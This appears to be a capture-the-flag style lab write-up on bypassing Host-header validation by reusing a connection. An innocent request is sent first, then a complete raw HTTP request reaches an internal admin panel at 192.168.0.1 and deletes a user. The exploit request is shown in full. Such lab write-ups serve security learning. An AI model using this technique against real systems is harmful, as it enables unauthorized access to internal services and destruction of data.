Title: Host validation bypass via connection state attack
Level: PRACTITIONER
Desc:  This lab is vulnerable to routing-based SSRF via the Host header. Although the front-end server may initially appear to perform robust validation of the Host header, it makes assumptions about all requests on a connection based on the first request it receives.
To solve the lab, exploit this behavior to access an internal admin panel located at 192.168.0.1/admin, then delete the user carlos. 

# Theory:
For example, you may occasionally encounter servers that only perform thorough validation on the first request they receive over a new connection. In this case, you can potentially bypass this validation by sending an innocent-looking initial request then following up with your malicious one down the same connection. 

# Walkthrough: 
I have created a group of requests, first requests have standard Host header, second try to make SSRF attack.
First in group:
<img width="1118" height="631" alt="image" src="https://github.com/user-attachments/assets/128780f9-b63d-4506-9827-8886e392e460" />

Second in group:
<img width="1239" height="732" alt="image" src="https://github.com/user-attachments/assets/aef4adea-6bf0-4a75-afd5-f27a1d5ed791" />

I changed second request to: 
```
POST /admin/delete HTTP/1.1
Host: 192.168.0.1
Cache-Control: max-age=0
Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
Content-Length: 53

username=carlos&csrf=vc572ZERm2LWkZSJYXqbcQsFo0dBEt2o
```

And sending it gave me what I wanted.
